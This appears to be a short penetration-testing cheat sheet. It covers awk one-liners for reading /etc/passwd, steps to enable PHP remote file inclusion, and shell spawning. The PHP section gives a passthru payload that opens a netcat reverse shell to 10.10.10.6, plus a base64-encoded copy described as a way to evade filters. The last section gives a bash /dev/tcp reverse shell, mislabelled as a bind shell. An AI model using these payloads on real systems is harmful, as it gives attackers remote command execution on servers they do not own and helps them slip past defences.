# === 'awk' Commands ===
"""
awk -F ":" '{print $1 $6}' /etc/passwd
	#-F sets the delineator, in other words, how awk recognizes columns from stdout
	
awk 'BEGIN{FS=":"; OFS="-"} {print $1,$6,$7}' /etc/passwd

awk -F "/" '/^\// {print $NF}' /etc/shells 
	#the carrot(^) grabs the beginning of every line, and the '\' escapes the '/' so that awk searches for every line that begins with a slash(/)
	#$NF is the last field of the awk stdout

awk 'length($0) < 8' /etc/shells

awk '$1 ~ /^[b,c]/ {print $0}' .bashrc
	#print every line where the first line is a 'b' or a 'c'
"""


# === Enable Remote File Inclusion on a PHP website ===
"""
sudo nano /etc/php5/cgi/php.ini

Ctrl + w
	allow_url
enable:
	"allow_url_fopen" & "allow_url_include"
restart web server:
	sudo /etc/init.d/apache2/restart


#execute OS commands w/ passthru() function
#create a php file:
<?php
passthru("nc -e /bin/sh 10.10.10.6 8080");
?>
#base64 encoding helps evade filters and php can decode it natively on server side
<?php
passthru(base64_decode("bmMgLWUgL2Jpbi9zaCAxMC4xMC4xMC42IDgwODA="));
?>
"""

# === Shell Spawning ===
"""
Python3 spawn a pty shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
-turn off terminal echo, foregrounds the shell
	export TERM=xterm
		stty raw -echo; fg 

Bash BIND shell:
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
"""
